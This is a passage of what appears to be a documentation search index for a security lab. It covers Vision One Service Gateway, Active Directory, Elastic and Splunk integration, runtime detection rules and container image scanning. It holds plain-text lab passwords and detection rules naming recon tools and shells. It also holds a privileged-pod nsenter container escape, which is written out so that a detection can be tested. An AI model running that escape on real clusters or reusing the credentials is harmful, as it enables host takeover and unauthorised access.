Gateway</code>.</p> <p></p> <p>There should only be one AMI shown for your current region. Click on <code>[Select]</code> and <code>[Subscribe now]</code>. </p> <p></p> <p>This will bring you to <code>Launch an instance</code>.</p> <p></p> <p>Give it a name, something like <code>Vision One Service Gateway</code> could make sense.</p> <p></p> <p></p> <ul> <li>Instance type: <code>c5.2xlarge</code></li> <li>Key pair name: your Playground One key pair</li> </ul> <p></p> <ul> <li>VPC: your Playground One VPC</li> <li>Subnet: one of the public Playground One subnets</li> </ul> <p></p> <p>Leave the security group settings for now as default.</p> <p></p> <p>Same to the storage.</p> <p>Check the summary and click on <code>[Launch instance]</code>.</p> <p>When the instance is up and running, get the public IP of the instance and proceed with the next step.</p>"},{"location":"scenarios/automation/service-gateway/v1-aws-service-gateway-manually/#activate-the-service-gateway","title":"Activate the Service Gateway","text":"<p>Back to your console/shell run the following command (adapt the parameters to your environment):</p> <pre><code>pgo --output network\n</code></pre> <pre><code>...\nmad_id = \"d-99677cba24\"\nmad_ips = toset([\n  \"10.0.0.37\",\n  \"10.0.1.229\",\n])\n...\nkey_name = \"pgo-key-pair-oaxuizlr\"\nmad_admin_password = &lt;sensitive&gt;\n...\nmad_admin_password = XrJ*5VPDZGmhhL70\n</code></pre> <p>The interesting value here is <code>key_name</code>.</p> <pre><code>key_name=&lt;key_name&gt;\npublic_ip=&lt;public IP of your Security Gateway instance&gt;\n\nssh -i ${ONEPATH}/${key_name}.pem admin@${public_ip}\n</code></pre> <p></p> <pre><code>enable\n\nregister &lt;your API Token from the first step&gt;\n</code></pre> <p>It can take some time for the Service Gateway to show up in the console.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/automation/service-gateway/v1-integrate-active-directory/","title":"Scenario: Integrate an Active Directory with Vision One via Service Gateway on AWS","text":""},{"location":"scenarios/automation/service-gateway/v1-integrate-active-directory/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Network with PGO Active Directory (recommended) and/or Managed Active Directory enabled</li> </ul> <p>Verify, that you have <code>AWS AD - create PGO Active Directory</code> and/or <code>AWS MAD - create Managed Active Directory</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nAWS MAD - create Managed Active Directory [true]:\n# and/or\nAWS AD - create PGO Active Directory [true]:\n...\n</code></pre> <pre><code>pgo --apply network\n</code></pre> <p>Log in to Domain Controller</p> <p>After the network has been set up, the service gateway has been deployed, and Active Directory has stabilized after about 10 minutes, you must authenticate to the domain controller using RDP at least once. Don't ask why. </p> <p>Use the public IP of the domain controller <code>ad_dc_ip</code> and the username <code>Administrator@&lt;your environment name&gt;.local</code>.</p>"},{"location":"scenarios/automation/service-gateway/v1-integrate-active-directory/#connect-an-active-directory","title":"Connect an Active Directory","text":"<p>In Vision One head over to <code>Workflow and Automation -&gt; Service Gateway Management</code> again. There should now be a Service Gateway listed. Select it, click on <code>Manage Services</code> just in the center, and download the <code>On-premise directory connection</code> to the gateway.</p> <p></p> <p></p> <p>Since the Playground One is able to create two different Active Directories depending on what you have enabled in your configuration continue if the following chapters.</p>"},{"location":"scenarios/automation/service-gateway/v1-integrate-active-directory/#connect-the-pgo-active-directory","title":"Connect the PGO Active Directory","text":"<p>From within your console/shell run the following command (or find the output from the previous step):</p> <pre><code>pgo --output network\n</code></pre> <pre><code>...\nad_ca_ip = \"54.93.162.135\"\nad_dc_ip = \"3.71.102.69\"\nad_dc_pip = \"10.0.4.57\"\n...\nad_admin_password = TrendMicro.1\n</code></pre> <p>The interesting values are now <code>ad_dc_pip</code> and the <code>ad_admin_password</code>.</p> <p>Lastly, in the Connection Settings choose the following parameters:</p> <ul> <li>Server Type: Microsoft Active Directory</li> <li>Server address: One of the private IPs out of <code>ad_dc_pip</code></li> <li>Encryption: <code>SSL</code></li> <li>Port: <code>636</code></li> <li>Base Distinguished Name: <code>Specific</code>, value: <code>DC=&lt;your environment name&gt;, DC=local</code></li> <li>Permission scope: <code>Read &amp; write</code></li> <li>User Name: <code>Administrator@&lt;your environment name&gt;.local</code></li> <li>Password: <code>ad_admin_password</code></li> </ul> <p>Example with environment name <code>pgo-id</code>:</p> <p></p> <p>This should connect the Active Directory to Vision One via the Service Gateway.</p> <p>Connect does not work</p> <p>If connecting to the Active Directory via the Third-Party Integration does still not work reboot the Domain Controller once.</p>"},{"location":"scenarios/automation/service-gateway/v1-integrate-active-directory/#install-security-event-forwarding","title":"Install Security Event Forwarding","text":"<p>Using the PGO Active Directory allows you to utilize the Security Event Forwarding. For this functionality you need to download the current installation package on the Domain Controller and walk through the installation procedure.</p> <p>Let's start from the beginning:</p> <p>First, head over to <code>Workflow and Automation -&gt; Service Gateway Management</code> and obtain your API Key (top right, this will be the same for all Service Gateways connected) the private IP of your Service Gateway, here <code>10.0.4.40</code>.</p> <p></p> <p>Next, in <code>Workflow and Automation -&gt; Service Gateway Management -&gt; Active Directory (on-premise)</code> open the tab <code>Security Event Forwarding</code> and click the button <code>[Download Installation Package]</code> to copy the link.</p> <p></p> <p>Connect to the Domain Controller and download the agent via the browser by pasting the link from above.</p> <p>Open the downloaded executable and install. </p> <p></p> <p></p> <p></p> <p></p> <p>Follow the workflow and file in the IP and API Key of your Service Gateway.</p> <p></p> <p>Heading back to the Active Directory integration of Vision One the agent should be listed after a short period of time.</p> <p></p>"},{"location":"scenarios/automation/service-gateway/v1-integrate-active-directory/#connect-the-managed-active-directory","title":"Connect the Managed Active Directory","text":"<p>From within your console/shell run the following command (or find the output from the previous step):</p> <pre><code>pgo --output network\n</code></pre> <pre><code>...\nmad_id = \"d-99677cba24\"\nmad_ips = toset([\n  \"10.0.0.37\",\n  \"10.0.1.229\",\n])\n...\nkey_name = \"pgo-key-pair-oaxuizlr\"\nmad_admin_password = &lt;sensitive&gt;\n...\nmad_admin_password = XrJ*5VPDZGmhhL70\n</code></pre> <p>The interesting values are now <code>mad_ips</code> and the <code>mad_admin_password</code>.</p> <p>Lastly, in the Connection Settings choose the following parameters:</p> <ul> <li>Server address: One of the private IPs out of <code>mad_ips</code></li> <li>Encryption: <code>NONE</code> (the MAD built by Playground One does not have a certificate yet)</li> <li>Port: <code>389</code></li> <li>Permission scope: <code>Read &amp; write</code></li> <li>User Name: <code>admin</code></li> <li>Password: <code>mad_admin_password</code></li> </ul> <p></p> <p>This should connect the Active Directory to Vision One via the Service Gateway.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/automation/thirdparty/elastic-stack-vision-one/","title":"Integrate Elastic Stack with Vision One","text":"<p>DRAFT</p> <p>Challenge ahead!</p> <p>This scenario is a bit challenging, but you should be able to get through it easily.</p>"},{"location":"scenarios/automation/thirdparty/elastic-stack-vision-one/#prerequisites","title":"Prerequisites","text":"<ul> <li>Docker Engine with Compose enabled</li> <li>Completed Scenario Elastic Setup</li> </ul>"},{"location":"scenarios/automation/thirdparty/elastic-stack-vision-one/#connect-the-trend-vision-one-for-elastic-app-to-vision-one","title":"Connect the Trend Vision One for Elastic App to Vision One","text":"<p>The App will pull data from Vision One. To allow this we need to head over to Vision One and create an API Key for your Elastic instance.</p> <p>In Vision One head over to <code>Workflow and Automation -&gt; Third-Party Ingegration</code> and filter for <code>Elastic</code> in the vendors section. This should filter on four available integration variants. Choose <code>Elastic</code> in this case.</p> <p></p> <p>Click on <code>[Generate]</code> and in the <code>Add API Key</code>-dialog on <code>[Add]</code>.</p> <p>Save the generated API Key in a secure location.</p> <p>Next, go back to your Kibana and navigate to <code>Management -&gt; Integrations</code> and find <code>Trend Micro Vision One</code>.</p> <p></p> <p>Click on the Integration.</p> <p></p> <p>Install the integration by clicking on the blue button <code>[Add Trend Micro Vision One]</code></p> <p></p> <p>Go through the settings and set URL und API Token. Leave everything to the defaults.</p> <p>As URL type <code>https://api.xdr.trendmicro.com</code> for an US instance of Vision One. Adapt the URL if your instance is located in another region (see FAQ).</p> <p></p> <p>Click on the button <code>[Save and continue]</code> in the bottom right.</p> <p>To be continued...</p>"},{"location":"scenarios/automation/thirdparty/elastic-stack-vision-one/#links","title":"Links","text":"<ul> <li>Integration: https://docs.elastic.co/integrations/trend_micro_vision_one</li> </ul>"},{"location":"scenarios/automation/thirdparty/elastic-stack/","title":"Get the Elastic Stack (ELK) Up and Running Locally","text":"<p>DRAFT</p> <p>Challenge ahead!</p> <p>This scenario is a bit challenging, but you should be able to get through it easily.</p>"},{"location":"scenarios/automation/thirdparty/elastic-stack/#prerequisites","title":"Prerequisites","text":"<ul> <li>Docker Engine with Compose enabled</li> <li>The host needs at least 8GB RAM available</li> </ul>"},{"location":"scenarios/automation/thirdparty/elastic-stack/#install-compose-if-required","title":"Install Compose (if required)","text":"<p>Use the following command to download:</p> <pre><code>mkdir -p ~/.docker/cli-plugins/\ncurl -SL https://github.com/docker/compose/releases/download/v2.3.3/docker-compose-linux-x86_64 -o ~/.docker/cli-plugins/docker-compose\n</code></pre> <p>Next, set the correct permissions so that the docker compose command is executable:</p> <pre><code>chmod +x ~/.docker/cli-plugins/docker-compose\n</code></pre> <p>To verify that the installation was successful, you can run:</p> <pre><code>docker compose version\n</code></pre> <p>You\u2019ll see output similar to this:</p> <pre><code>Output\nDocker Compose version v2.3.3\n</code></pre> <p>Docker Compose is now successfully installed on your system. In the next section, you\u2019ll see how to set up a <code>docker-compose.yaml</code> file and get a containerized environment up and running with this tool.</p>"},{"location":"scenarios/automation/thirdparty/elastic-stack/#start-your-elk-stack","title":"Start your ELK-Stack","text":"<p>First, change to the working directory.</p> <pre><code># Change to working directory\ncd ${ONEPATH}/stacks/elastic\n</code></pre> <p>Feel free to review the files, especially the <code>docker-compose.yaml</code> which creates the stack.</p> <p>Now run</p> <pre><code>docker compose up\n</code></pre> <p>The first startup requires some minutes to complete.</p> <p>Optionally, check the certificate for your stack:</p> <pre><code>docker cp elastic-es01-1:/usr/share/elasticsearch/config/certs/ca/ca.crt /tmp/.\n\ncurl --cacert /tmp/ca.crt -u elastic:TrendMicro.1 https://localhost:9200\n</code></pre> <p>This should return something similar like this:</p> <pre><code>{\n  \"name\" : \"es01\",\n  \"cluster_name\" : \"docker-cluster\",\n  \"cluster_uuid\" : \"wmp-Yz-WQPq4_kfzzyo8wg\",\n  \"version\" : {\n    \"number\" : \"8.13.4\",\n    \"build_flavor\" : \"default\",\n    \"build_type\" : \"docker\",\n    \"build_hash\" : \"da95df118650b55a500dcc181889ac35c6d8da7c\",\n    \"build_date\" : \"2024-05-06T22:04:45.107454559Z\",\n    \"build_snapshot\" : false,\n    \"lucene_version\" : \"9.10.0\",\n    \"minimum_wire_compatibility_version\" : \"7.17.0\",\n    \"minimum_index_compatibility_version\" : \"7.0.0\"\n  },\n  \"tagline\" : \"You Know, for Search\"\n}\n</code></pre> <p>Try to access your Kibana instance, the main UI of your Elastic Stack, at http://localhost:5601 and use the following credentials:</p> <ul> <li>Username: <code>elastic</code></li> <li>Password: <code>TrendMicro.1</code></li> </ul> <p>Within Kibana, open the navigation (top left) and head over to <code>Management -&gt; Stack Monitoring</code>. There should be a dialog popping up to create <code>Out-of-the box rules</code>. Do it.</p> <p></p> <p>Detached Mode</p> <p>If you want to run the stack continuously restart the stack but append <code>-d</code> to activate detached mode.</p> <p><code>docker compose up -d</code></p>"},{"location":"scenarios/automation/thirdparty/elastic-stack/#tear-down-elastic","title":"Tear Down Elastic","text":"<p>If you at some point want to delete your ELK Stack instance run the following command:</p> <pre><code>docker compose down -v\n</code></pre> <p>This will remove all containers, volumes, and the network.</p>"},{"location":"scenarios/automation/thirdparty/splunk-integrate-vision-one-custom-rules/","title":"Integrate V1CS Customer Runtime Security Rules with Splunk","text":"<p>Challenge ahead!</p> <p>This scenario is a bit challenging, but you should be able to get through it easily.</p>"},{"location":"scenarios/automation/thirdparty/splunk-integrate-vision-one-custom-rules/#prerequisites","title":"Prerequisites","text":"<ul> <li>Docker Engine with Compose enabled</li> <li>Completed Scenario Splunk Setup</li> </ul>"},{"location":"scenarios/automation/thirdparty/splunk-integrate-vision-one-custom-rules/#configure-http-event-collector-in-splunk","title":"Configure HTTP Event Collector in Splunk","text":"<p>Beeing authenticated to Splunk navigate to <code>Settings -&gt; Data -&gt; Data inputs</code> and create a new <code>HTTP Event Collector</code> by clicking <code>[+ Add new]</code> on the right hand side.</p> <p></p> <p></p> <p>Create a <code>V1CS Custom Rule Events</code></p> <p></p> <p>Click <code>[Next]</code>, which you will bring to the <code>Input Settings</code>.</p> <p></p> <p>On the this page we will create a new indexer first. To do so, click on <code>Create a new index</code>.</p> <p></p> <p>Name it <code>v1cs_custom_rule_events</code>, and change App to <code>Splunk Analytics Workspace</code>. </p> <p></p> <p>Leave all the rest as default and click <code>[Save]</code>.</p> <p>Back at the Input Settings, move the newly created index to the right by clicking on it.</p> <p></p> <p>Proceed with <code>[Review &gt;]</code> in the upper right.</p> <p>Proceed with <code>[Submit &gt;]</code> in the upper right.</p> <p></p> <p>You now want to copy the <code>Token Value</code> and paste it to your notes.</p> <p>The <code>Token Value</code> is also shown on <code>Settings -&gt; Data -&gt; Data inputs</code>, select <code>HTTP Event Collector</code> which shows our just created collector and the <code>Token Value</code>.</p> <p></p> <p>Btw, you need to know the IP address of your docker host later.</p>"},{"location":"scenarios/automation/thirdparty/splunk-integrate-vision-one-custom-rules/#integrate-custom-rules-to-v1cs","title":"Integrate Custom Rules to V1CS","text":"<p>Custom Rules for Vision One Container Security do work with any kind of the provided Kubernetes clusters (EKS with EC2 or Fargate, or Kind).</p> <p>Below, how to do this using the built in Kind cluster:</p> <p>Prerequisite: Vision One Container Security configured in Playground One configuration.</p> <pre><code>pgo --init kind\npgo --apply kind\n</code></pre> <p>The above will create the cluster and deploy Container Security.</p> <p>Next, run the following commands in your shell:</p> <pre><code># Create and change to working directory\nmkdir -p ${ONEPATH}/customrules\ncd ${ONEPATH}/customrules\n\n# Download helm release\ntag=2.3.38\ncurl -LOs https://github.com/trendmicro/cloudone-container-security-helm/archive/refs/tags/${tag}.tar.gz\ntar xfz ${tag}.tar.gz\n\n# Navigate to the customrules directory\ncd cloudone-container-security-helm-${tag}/config/customrules\n</code></pre> <p>Next, we're creating a sample custom rule. Do this by running the following command:</p> <pre><code>cat &lt;&lt;EOF &gt;./playground_rules.yaml\n# ################################################################################\n# Information Gathering\n# ################################################################################\n- macro: container\n  condition: (container.id != host)\n\n# We create an event, if someone runs an information gathering tool within a container\n- list: information_gathering_tools\n  items:\n    [\n      whoami,\n      nmap,\n      racoon,\n      ip,\n    ]\n\n- rule: (PG-IG) Information gathering detected\n  desc: An information gathering tool is run in a Container\n  condition: evt.type = execve and evt.dir=&lt; and container.id != host and proc.name in (information_gathering_tools)\n  output: \"Information gathering tool run in container (user=%user.name %container.info parent=%proc.pname cmdline=%proc.cmdline)\"\n  priority: WARNING\nEOF\n</code></pre> <p>This rule will trigger, when you run the command <code>whoami</code> inside of a container. Nothing serious, but it should show how it works.</p> <p>After changing back to our working directory with</p> <pre><code>cd ${ONEPATH}/customrules\n</code></pre> <p>we create an additional overrides file which enables custom rules in Container Security. Run</p> <pre><code>splunk_http_event_collector=http://&lt;IP address of your docker host&gt;:8088\nsplunk_token_value=&lt;Token Value from the previous step&gt;\n# Example:\n# splunk_http_event_collector=http://192.168.1.122:8088\n# splunk_token_value=e21a2ff0-3c17-4be7-9871-2417f3c9e19f\n\ncat &lt;&lt;EOF &gt;./overrides-custom-rules.yaml\ncloudOne:\n  runtimeSecurity:\n    enabled: true\n    customRules:\n      enabled: true\n      output:\n        json: true\n        splunk:\n          url: ${splunk_http_event_collector}/services/collector/raw\n          headers:\n          - \"Authorization: Splunk ${splunk_token_value}\"\nEOF\n</code></pre> <p>Now, upgrade the helm deployment of Container Security in your cluster. Run:</p> <pre><code>helm get values --namespace trendmicro-system container-security | \\\n  helm upgrade container-security \\\n    --namespace trendmicro-system \\\n    --values - \\\n    --values overrides-custom-rules.yaml \\\n    cloudone-container-security-helm-2.3.38\n</code></pre> <p>The above basically reads out the current values of the Container Security deployment, adds our overrides to enable custom rules, and upgrades the deployment.</p> <p>Example upgrade output:</p> <pre><code>Release \"container-security\" has been upgraded. Happy Helming!\nNAME: container-security\nLAST DEPLOYED: Tue Jun 11 12:37:39 2024\nNAMESPACE: trendmicro-system\nSTATUS: deployed\nREVISION: 13\nTEST SUITE: None\n</code></pre>"},{"location":"scenarios/automation/thirdparty/splunk-integrate-vision-one-custom-rules/#testing-it","title":"Testing it...","text":"<p>Now, let's test what we did. We're quickly creating a shell in our Kubernetes cluster here:</p> <pre><code>kubectl run -it --image=ubuntu shell --restart=Never --rm -- /bin/bash\n</code></pre> <p>It's just a simple Ubuntu shell what you should get, but it runs as a Pod on your cluster.</p> <pre><code>If you don't see a command prompt, try pressing enter.\nroot@shell:/# \n</code></pre> <p>Now, run the command <code>whomi</code> which will tell you, that you're <code>root</code> :-).</p> <pre><code>root@shell:/# whoami\nroot\n</code></pre> <p>Now, back to Splunk...</p> <p>Navigate to <code>Search &amp; Reporting &gt;</code></p> <p></p> <p>As the <code>Search</code> query type:</p> <pre><code>source=\"http:V1CS Custom Rule Events\" index=\"v1cs_custom_rule_events\"\n</code></pre> <p></p> <p>This should reveal our information gathering attempt...</p> <p></p> <p>Look for <code>proc.cmdline=</code>.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/automation/thirdparty/splunk-integrate-vision-one-custom-rules/#some-other-custom-rules-you-can-play-with","title":"Some other Custom Rules You can Play with","text":"<p>Simply append the yamls below to your <code>/config/customrules/playground_rules.yaml</code>.</p> <pre><code># ################################################################################\n# Container Escape\n# ################################################################################\n- macro: is_kind\n  condition: container.image startswith \"kindest/node:\"\n\n# Container Escape with nsenter\n# Not 100% sure about the deltatime thing\n# Runnig a nsenter -t 1 -m -u -i -n bash will result in four findings if no\n# deltatime is defined. \n- rule: (PG-ESC) Detect Container Escape (nsenter)\n  desc: Detect a container escape using nsenter\n  condition: &gt;\n    evt.type = setns\n    and container\n    and container.privileged=true\n    and container.image != \"\"\n    and evt.deltatime &gt; 8000\n    and not is_kind\n  output: &gt;\n    The command nsenter was used to run a process within the name spaces of another process from within a container\n    (user=%user.name command=%proc.cmdline parent=%proc.pname pcmdline=%proc.pcmdline gparent=%proc.aname[2]\n    container=%container.name image=%container.image)\n  priority: ERROR\n  tags: [escape]\n</code></pre> <p>And don't forget to upgrade the helm deployment of Container Security in your cluster.</p> <pre><code>helm get values --namespace trendmicro-system container-security | \\\n  helm upgrade container-security \\\n    --namespace trendmicro-system \\\n    --values - \\\n    --values overrides-custom-rules.yaml \\\n    cloudone-container-security-helm-2.3.38\n</code></pre> <p>Exploit Container Escape with <code>nsenter</code>:</p> <p>Start a privileged container in Kubernetes:</p> <pre><code>kubectl run -it --image=alpine s --restart=Never --rm --overrides '{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"shell\",\"image\":\"alpine\",\"stdin\":true,\"tty\":true,\"command\":[\"/bin/sh\"],\"securityContext\":{\"privileged\":true}}]}}'\n</code></pre> <p>From within the container run: <code>nsenter -t 1 -m -u -i -n sh</code></p> <p>With the below we're detecting if a shell is created within a pod, whereby we differentiate if it is a root-shell or a regular user shell.</p> <pre><code># ################################################################################\n# Shell Usage in Container\n# ################################################################################\n- macro: spawned_process\n  condition: (evt.type in (execve, execveat) and evt.dir=&lt;)\n\n- list: shell_binaries\n  items: [ash, bash, csh, ksh, sh, tcsh, zsh, dash]\n\n- macro: shell_procs\n  condition: (proc.name in (shell_binaries))\n\n# Detect attach/exec with terminal shell as root or user\n- macro: is_user_shell\n  condition: (proc.vpid!=1 and user.uid!=0)\n\n- macro: is_root_shell\n  condition: (proc.vpid!=1 and user.uid=0)\n\n- rule: (PG-SHELL) Attach/Exec Pod with Terminal User shell in container\n  desc: A shell was created inside an unprivileged container with an attached terminal.\n  condition: &gt;\n    spawned_process and container\n    and shell_procs and proc.tty != 0\n    and is_user_shell\n  output: &gt;\n    A shell was spawned in a container with an attached terminal (user=%user.name user_loginuid=%user.loginuid %container.info\n    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline terminal=%proc.tty container_id=%container.id image=%container.image.repository)\n  priority: WARNING\n  tags: [container, shell, mitre_execution]\n  enabled: true\n\n- rule: (PG-SHELL) Attach/Exec Pod with Terminal Root shell in container\n  desc: A shell was created inside a container which runs as root user with an attached terminal.\n  condition: &gt;\n    spawned_process and container\n    and shell_procs and proc.tty != 0\n    and is_root_shell\n  output: &gt;\n    A shell with root privileges was spawned in a container running as root with an attached terminal (user=%user.name\n    user_loginuid=%user.loginuid %container.info shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline terminal=%proc.tty\n    container_id=%container.id image=%container.image.repository)\n  priority: WARNING\n  tags: [container, shell, mitre_execution]\n  enabled: true\n</code></pre> <p>Trigger:</p> <p>Find a Pod you want a shell in</p> <pre><code>kubectl get pods -A\n</code></pre> <p>and then try to open a shell with</p> <pre><code>kubectl exec -it -n &lt;NAMESPACE&gt; &lt;POD&gt; -- /bin/sh\n</code></pre>"},{"location":"scenarios/automation/thirdparty/splunk-integrate-vision-one-xdr/","title":"Integrate Splunk with Vision One XDR","text":""},{"location":"scenarios/automation/thirdparty/splunk-integrate-vision-one-xdr/#prerequisites","title":"Prerequisites","text":"<ul> <li>Docker Engine with Compose enabled</li> <li>Completed Scenario Splunk Setup</li> </ul>"},{"location":"scenarios/automation/thirdparty/splunk-integrate-vision-one-xdr/#install-the-trend-vision-one-for-splunk-xdr-app","title":"Install the Trend Vision One for Splunk (XDR) App","text":"<p>Navigate to <code>Apps -&gt; Manage Apps</code> in the top left of your Splunk frontent. Click on the green <code>[Browse more apps]</code> button in the top right afterwards.</p> <p>Now, type <code>trend micro</code> in the search bar at the top left and press <code>[Enter]</code>.</p> <p>You should see seven apps as the result, whereby one is <code>Trend Vision One for Splunk (XDR)</code>.</p> <p></p> <p>Click the green <code>[Install]</code>-button.</p> <p>In the next dialog you will be prompted to enter your personal user credentials of your Splunk account:</p> <p></p> <p>You will be promped to restart Splunk. After the successful restart you should see the XDR App as shown below.</p> <p></p>"},{"location":"scenarios/automation/thirdparty/splunk-integrate-vision-one-xdr/#connect-splunk-to-vision-one","title":"Connect Splunk to Vision One","text":"<p>The XDR App will pull data from Vision One. To allow this we need to head over to Vision One and create an API Key for your Splunk instance.</p> <p>In Vision One head over to <code>Workflow and Automation -&gt; Third-Party Ingegration</code> and filter for <code>Splunk</code> in the vendors section. This should filter on four available integration variants. Choose <code>Splunk XDR</code> in this case.</p> <p></p> <p>Click on <code>[Generate]</code> and in the <code>Add API Key</code>-dialog on <code>[Add]</code>.</p> <p>Save the generated API Key in a secure location.</p> <p>Next, go back to your Splunk and the XDR App we just installed. In the apps menu select <code>Configuration</code> and click on the pencil button of the <code>default_account</code>.</p> <p></p> <p>As URL type <code>https://api.xdr.trendmicro.com</code> for an US instance of Vision One. Adapt the URL if your instance is located in another region (see FAQ).</p> <p>As the <code>Authentication token</code> paste the API Key generated in Vision One beforehand.</p> <p></p> <p>Click <code>[Update]</code>.</p> <p>From now on, any new Workbench Alerts and OATs should show up in Splunk.</p>"},{"location":"scenarios/automation/thirdparty/splunk-integrate-vision-one-xdr/#optional-generate-detections-locally","title":"(Optional) Generate Detections Locally","text":"<p>If you want to automatically generate Workbenches and OATs deploy any of the provided Scenario configurations of Playground One (EKS with EC2 or Fargate, or Kind).</p> <p>Below, how to do this using the built in Kind cluster:</p> <p>Prerequisite: Vision One Container Security configured in Playground One configuration.</p> <pre><code>pgo --init kind\npgo --apply kind\npgo --apply scenarios-kind\n</code></pre> <p>The Kind scenarios will generate findings every full hour.</p> <p></p>"},{"location":"scenarios/automation/thirdparty/splunk-setup/","title":"Get Splunk Up and Running Locally","text":""},{"location":"scenarios/automation/thirdparty/splunk-setup/#prerequisites","title":"Prerequisites","text":"<ul> <li>Docker Engine with Compose enabled</li> </ul>"},{"location":"scenarios/automation/thirdparty/splunk-setup/#install-compose-if-required","title":"Install Compose (if required)","text":"<p>Use the following command to download:</p> <pre><code>mkdir -p ~/.docker/cli-plugins/\ncurl -SL https://github.com/docker/compose/releases/download/v2.3.3/docker-compose-linux-x86_64 -o ~/.docker/cli-plugins/docker-compose\n</code></pre> <p>Next, set the correct permissions so that the docker compose command is executable:</p> <pre><code>chmod +x ~/.docker/cli-plugins/docker-compose\n</code></pre> <p>To verify that the installation was successful, you can run:</p> <pre><code>docker compose version\n</code></pre> <p>You\u2019ll see output similar to this:</p> <pre><code>Output\nDocker Compose version v2.3.3\n</code></pre> <p>Docker Compose is now successfully installed on your system. In the next section, you\u2019ll see how to set up a <code>docker-compose.yaml</code> file and get a containerized environment up and running with this tool.</p>"},{"location":"scenarios/automation/thirdparty/splunk-setup/#start-splunk","title":"Start Splunk","text":"<p>First, change to the working directory.</p> <pre><code># Change to working directory\ncd ${ONEPATH}/stacks/splunk\n</code></pre> <p>Feel free to review the files, especially the <code>docker-compose.yaml</code> which creates the stack.</p> <p>Now run</p> <pre><code>docker compose up\n</code></pre> <p>This will prepare a Splunk Free, which can process up to 500MB per day.</p> <p>The first startup requires some minutes to complete.</p> <p>Try to access your Splunk instance at http://localhost:8000 and use the following credentials:</p> <ul> <li>Username: <code>admin</code></li> <li>Password: <code>TrendMicro.1</code></li> </ul> <p>Detached Mode</p> <p>If you want to run the stack continuously restart the stack but append <code>-d</code> to activate detached mode.</p> <p><code>docker compose up -d</code></p>"},{"location":"scenarios/automation/thirdparty/splunk-setup/#have-a-splunk-user-account","title":"Have a Splunk User Account","text":"<p>To be able to download Add-Ons for your Splunk you need to own a free Splunk user account. If you don't already have one, create it here.</p>"},{"location":"scenarios/automation/thirdparty/splunk-setup/#tear-down-splunk","title":"Tear Down Splunk","text":"<p>If you at some point want to delete your Splunk instance run the following command:</p> <pre><code>docker compose -v\n</code></pre> <p>This will remove all containers, volumes, and the network.</p>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-artifact-scanning/","title":"Scenario: Container Image Scanning for Vulnerabilities, Malware, and Secrets","text":""},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-artifact-scanning/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Container Security Artifact Scanner API-Key with the following permissions:<ul> <li>Cloud Security Operations<ul> <li>Container Protection<ul> <li>Run artifact scan</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>Ensure to have the latest <code>tmas</code> deployed:</p> <pre><code>tmcli-update\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-artifact-scanning/#scan-images","title":"Scan Images","text":"<p>First, set the Artifact Scanner API-Key as an environment variable:</p> <pre><code>export TMAS_API_KEY=&lt;YOUR API-Key&gt;\n</code></pre> <p>Note: tmas defaults to the Vision One service region <code>us-east-1</code>. If your Vision One is serviced from any other region you need to add the <code>--region</code> flag to the scan request.</p> <p>Valid regions: <code>[ap-southeast-2 eu-central-1 ap-south-1 ap-northeast-1 ap-southeast-1 us-east-1]</code></p> <p>The <code>tmas</code> tools supports three scan variants:</p> <ul> <li>malware, -M          Perform a malware scan on an image artifact</li> <li>secrets, -S          Perform a secrets scan on an artifact</li> <li>vulnerabilities, -V  Perform a vulnerability scan on an artifact</li> </ul> <p>You can either choose an individual scan type or combine multiple via flags.</p> <p>To easily scan an image for vulnerabililies run</p> <pre><code># Service region us-east-1\ntmas scan vulnerabilities docker:nginx:latest\n# short\ntmas scan -V docker:nginx:latest\n\n# Service region eu-central-1\ntmas scan vulnerabilities docker:nginx:latest --region eu-central-1\n</code></pre> <p>Scanning an image for vulnerabilities and malware simultaneously is as easy as above</p> <pre><code>tmas scan -VM docker:mawinkler/evil2:latest\n</code></pre> <p>At the time of writing, the second scan should find 137 vulnerabilities and one malware:</p> <pre><code>{\n  \"vulnerabilities\": {\n    \"totalVulnCount\": 137,\n    \"criticalCount\": 0,\n    \"highCount\": 4,\n    \"mediumCount\": 65,\n    \"lowCount\": 61,\n    \"negligibleCount\": 7,\n    \"unknownCount\": 0,\n    \"overriddenCount\": 0,\n    \"findings\": { \n...\n  \"malware\": {\n    \"scanResult\": 1,\n    \"findings\": [\n      {\n        \"layerDigest\": \"sha256:d5fafe98396dfece28a75fc06ef876bf2e9014d62d908f8296a925bab92ab4b9\",\n        \"layerDiffID\": \"sha256:d5fafe98396dfece28a75fc06ef876bf2e9014d62d908f8296a925bab92ab4b9\",\n        \"fileName\": \"eicarcom2.zip\",\n        \"fileSize\": 308,\n        \"fileSHA256\": \"sha256:e1105070ba828007508566e28a2b8d4c65d192e9eaf3b7868382b7cae747b397\",\n        \"foundMalwares\": [\n          {\n            \"fileName\": \"__Zoq9GPNzgoaVyXYSKgniGj__\",\n            \"malwareName\": \"OSX_EICAR.PFH\"\n          }\n        ]\n      }\n    ],\n    \"scanID\": \"53e856d2-6385-46f7-b661-21d01b3604a2\",\n    \"scannerVersion\": \"1.0.0-66\"\n  }\n}\n</code></pre> <p>Another malware example might be this:</p> <pre><code>tmas scan malware registry:quay.io/petr_ruzicka/malware-cryptominer-container:2.1.1\n</code></pre> <p>Scanning for secrets is very similar:</p> <pre><code>tmas scan secrets registry:trufflesecurity/secrets\n</code></pre>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-artifact-scanning/#false-positives","title":"False Positives","text":"<p>Here, we're going to tackle false positives in the scan results</p>"},{"location":"scenarios/cloud-security/container-security/artifact-scanning/tmas-artifact-scanning/#secrets","title":"Secrets","text":"<p>Depending on the programming language used in a containerized app and how it got containerized <code>tmas</code> will likely discover lots of generic secrets. These false positives are usually found within unit tests or examples included in the language runtime distribution.</p> <p>Let's play with one of my apps, UpTonight.</p> <p>Running a scan on my <code>dev</code> image (10/09/2024):</p> <pre><code>tmas scan -VMS 